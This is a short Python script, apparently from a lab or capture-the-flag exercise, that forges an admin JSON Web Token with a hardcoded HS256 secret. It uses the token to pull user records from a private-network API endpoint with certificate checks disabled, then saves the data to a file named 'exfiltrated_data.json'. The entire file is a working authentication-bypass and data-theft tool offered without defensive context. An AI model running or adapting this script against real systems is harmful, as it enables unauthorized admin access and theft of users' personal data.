import jwt
import time
import requests
import urllib3
import json

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exfiltrate(secret, url):
    payload = {
        "sub": "1",
        "name": "admin",
        "role": "Admin",
        "iss": "SecureWebApp",
        "aud": "SecureWebAppClient",
        "exp": int(time.time()) + 3600
    }
    token = jwt.encode(payload, secret, algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}
    
    print(f"Requesting data from {url}...")
    response = requests.get(url, headers=headers, verify=False)
    
    if response.status_code == 200:
        data = response.json()
        with open("exfiltrated_data.json", "w") as f:
            json.dump(data, f, indent=2)
        print(f"SUCCESS! Exfiltrated {len(data.get('data', []))} user records.")
        print(json.dumps(data, indent=2)[:500] + "...")
    else:
        print(f"FAILED! Status: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    secret = "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg="
    url = "https://192.168.56.137/backend/api/users"
    exfiltrate(secret, url)
